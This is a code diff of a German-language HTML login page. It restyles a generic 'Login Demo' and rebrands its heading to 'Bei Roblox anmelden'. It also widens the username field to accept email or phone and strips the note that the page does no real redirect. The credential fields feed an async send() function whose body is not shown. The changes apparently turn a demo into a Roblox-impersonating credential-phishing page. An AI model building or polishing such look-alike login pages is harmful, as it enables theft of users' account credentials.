@@ -5,10 +5,14 @@
 <title>Login Demo</title>
 
 <style>
+* {
+  box-sizing: border-box;
+}
+
 body {
   margin: 0;
-  font-family: Arial;
-  background: #12141c;
+  font-family: Arial, sans-serif;
+  background: linear-gradient(135deg, #0f1115, #050607);
   display: flex;
   justify-content: center;
   align-items: center;
@@ -18,13 +22,14 @@ body {
 
 .box {
   width: 360px;
-  border: 1px solid #3a3d45;
-  padding: 25px;
   background: #1c1f26;
+  border: 1px solid #3a3d45;
+  padding: 30px;
 }
 
 h2 {
   margin-bottom: 20px;
+  font-size: 24px;
 }
 
 input {
@@ -34,25 +39,31 @@ input {
   border: 1px solid #3a3d45;
   background: #2a2d35;
   color: white;
+  font-size: 14px;
 }
 
-button {
+input::placeholder {
+  color: #aaa;
+}
+
+.main-btn {
   width: 100%;
   padding: 14px;
-  margin-top: 10px;
   border: 1px solid #3a3d45;
   background: transparent;
   color: white;
   cursor: pointer;
+  margin-top: 10px;
 }
 
-button:hover {
+.main-btn:hover {
   background: #2a2d35;
 }
 
 .link {
   text-align: center;
   margin-top: 15px;
+  font-size: 14px;
   cursor: pointer;
 }
 
@@ -62,9 +73,18 @@ button:hover {
   margin: 20px 0;
 }
 
-.secondary {
+.secondary-btn {
+  width: 100%;
+  padding: 14px;
+  margin-top: 10px;
   background: #2a2d35;
   border: none;
+  color: white;
+  cursor: pointer;
+}
+
+.secondary-btn:hover {
+  background: #3a3d45;
 }
 </style>
 </head>
@@ -72,30 +92,21 @@ button:hover {
 <body>
 
 <div class="box">
-  <h2>Anmelden (Demo)</h2>
+  <h2>Bei Roblox anmelden</h2>
 
-  <input id="user" placeholder="Benutzername">
+  <input id="user" placeholder="Benutzer/E-Mail/Telefon">
   <input id="pass" type="password" placeholder="Passwort">
 
-  <button onclick="send()">Anmelden</button>
+  <button class="main-btn" onclick="send()">Anmelden</button>
 
-  <div class="link" onclick="info()">
-    Passwort vergessen?
-  </div>
+  <div class="link" onclick="info()">Passwort vergessen?</div>
 
   <div class="divider"></div>
 
-  <button class="secondary" onclick="info()">
-    Code per E-Mail senden
-  </button>
+  <button class="secondary-btn" onclick="info()">Einmaligen Code per E-Mail senden</button>
+  <button class="secondary-btn" onclick="info()">Schnellanmeldung</button>
 
-  <button class="secondary" onclick="info()">
-    Schnellanmeldung
-  </button>
-
-  <div class="link" onclick="info()">
-    Registrieren
-  </div>
+  <div class="link" onclick="info()">Registrieren</div>
 </div>
 
 <script>
@@ -113,7 +124,7 @@ async function send() {
 }
 
 function info() {
-  alert("Demo-Funktion (keine echte Weiterleitung)");
+  alert("Demo-Funktion");
 }
 </script>
 
